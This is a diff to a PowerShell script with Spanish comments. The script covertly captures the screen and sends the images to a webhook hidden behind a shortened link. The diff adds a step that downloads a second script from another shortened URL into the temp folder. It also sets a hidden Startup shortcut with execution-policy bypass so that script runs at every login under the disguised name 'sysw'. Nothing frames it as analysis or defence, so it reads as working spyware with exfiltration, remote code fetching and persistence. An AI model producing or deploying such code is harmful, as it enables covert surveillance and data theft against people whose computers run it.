@@ -1,5 +1,6 @@
-# Definir el Webhook URL y el intervalo de tiempo
-$hookurl = "https://bit.ly/web_chupakbras"
+# Definir el URL del script y el webhook
+$scriptURL = "https://bit.ly/Screen_dc"
+$webhookURL = "https://bit.ly/web_chupakbras"
 $seconds = 45 # Intervalo de captura de pantalla en segundos
 $a = 1 # Cantidad de capturas de pantalla
 
@@ -44,19 +45,23 @@ function Take-Screenshot {
 function Start-ScreenshotLoop {
     while ($a -gt 0) {
         $Filett = Take-Screenshot
-        Send-Screenshot -ImageFile $Filett -WebhookURL $hookurl
+        Send-Screenshot -ImageFile $Filett -WebhookURL $webhookURL
         Remove-Item -Path $Filett
         Start-Sleep -Seconds $seconds
         $a--
     }
 }
 
-# Ejecutar el bucle de capturas de pantalla al iniciar Windows
+# Descargar el script desde el URL
+$scriptFile = "$env:temp\sysw.ps1"
+Invoke-WebRequest -Uri $scriptURL -OutFile $scriptFile
+
+# Ejecutar el script al iniciar Windows de manera oculta
 $shortcutPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
 $shell = New-Object -ComObject WScript.Shell
 $shortcut = $shell.CreateShortcut($shortcutPath)
 $shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptFile`""
 $shortcut.Save()
 
 # Iniciar el bucle de capturas de pantalla
